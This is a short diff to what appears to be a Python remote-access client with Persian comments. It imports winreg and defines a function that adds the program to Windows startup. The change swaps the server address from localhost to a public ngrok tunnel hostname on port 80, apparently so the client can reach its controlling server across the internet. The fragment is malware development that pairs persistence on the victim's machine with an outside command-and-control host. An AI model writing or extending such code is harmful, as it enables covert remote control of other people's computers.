@@ -6,8 +6,8 @@ import sys
 import winreg  # برای کار با رجیستری ویندوز
 
 # تنظیمات سرور
-SERVER_IP = '127.0.0.1'  # آدرس IP سرور (localhost)
-SERVER_PORT = 8080  # پورت برای ارتباط با سرور
+SERVER_IP = 'c2a4-77-77-94-87.ngrok-free.app'  # آدرس ngrok
+SERVER_PORT = 80  # پورت ngrok (برای HTTP همیشه پورت 80 است)
 
 # اضافه کردن برنامه به استارتاپ ویندوز
 def add_to_startup():
